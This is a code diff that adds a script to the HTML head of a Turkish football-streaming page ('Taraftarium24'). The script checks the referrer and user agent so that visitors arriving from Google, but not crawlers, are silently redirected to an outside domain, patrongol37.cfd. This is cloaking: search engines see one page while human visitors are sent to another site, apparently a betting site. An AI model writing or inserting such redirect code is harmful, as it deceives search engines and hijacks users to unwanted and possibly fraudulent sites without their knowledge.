@@ -1,6 +1,16 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head><meta charset="utf-8">
+     <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patrongol37.cfd");
+    }
+  </script>
 <meta name="google-site-verification" content="l2R1DLNjN57t_kIpjF1DlnlabGfIQ8VaDddw_zIve_0" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Taraftarium24 - Taraftarium24 Yeni Maç İzleme Linkleri - Canlı Maç İzleme Siteleri 2026</title>
